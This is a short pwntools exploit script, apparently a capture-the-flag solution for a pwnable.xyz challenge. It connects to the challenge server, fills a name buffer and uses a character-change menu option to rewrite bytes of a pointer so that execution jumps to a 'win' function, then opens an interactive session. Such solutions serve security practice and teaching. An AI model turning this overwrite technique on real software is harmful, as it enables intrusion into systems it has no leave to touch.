from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
# p = process('./challenge')
p = remote('svc.pwnable.xyz',30015)
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)

cur = 0x00000000006022C0 # (32)
saves = 0x00000000006022E0
win = 0x0000000000400cf3

def quit():
	sa('>','0')

def play():
	sa('>','1')

def save_game(name):
	sa('>','2')
	sa(':',name)

def delete_save(idx):
	sa('>','3')
	sa(':',str(idx))

def print_name():
	sa('>','4')

def change_char(a,b):
	sa('>','5')
	sla(':',a)
	sla(':',b)

sa(':','A'*127) # Name:
change_char('B','B')
change_char('C','C')
change_char('D','D')
change_char('E','E')
change_char('F','F')
change_char('\x0d','\x0c')
change_char('\x6b','\xf3')

play()

p.interactive()